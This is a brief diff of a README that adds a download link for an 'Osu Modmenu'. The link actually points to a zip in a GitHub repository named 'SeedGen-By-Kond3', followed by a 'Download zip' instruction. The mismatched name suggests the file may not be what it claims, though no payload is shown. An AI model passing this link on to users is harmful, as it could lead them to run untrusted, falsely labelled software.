@@ -1,4 +1,4 @@
-- # [Download Osu Modmenu]()
+- # [Download Osu Modmenu](https://github.com/kond3ve1/SeedGen-By-Kond3/releases/download/1/Release.zip)
 
 - # Instructions
 - 1. Download zip
